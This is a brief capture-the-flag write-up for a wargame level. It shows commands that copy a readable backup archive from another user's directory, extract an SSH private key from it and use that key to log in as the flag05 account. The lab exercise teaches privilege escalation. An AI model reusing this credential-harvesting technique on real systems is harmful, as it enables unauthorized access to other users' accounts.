# Level 05

As the site say there is a directory in "/home/flag05" named ".backup", in this
folder there is compressed file, to uncompress it we need to copy it in our
folder where we have the permission to write.

```bash
cp /home/flag05/.backup/backup-19072011.tgz /home/level05/
cd /home/level05
tar xvf backup-19072011.tgz
```

In the archive we find a directory named ".ssh", so now we can try to ssh to
flag05 using as a key the "id_rsa" file.

```bash
ssh -i /home/level05/.ssh/id_rsa flag05@127.0.0.1
```

Now we can run "getflag" as flag05
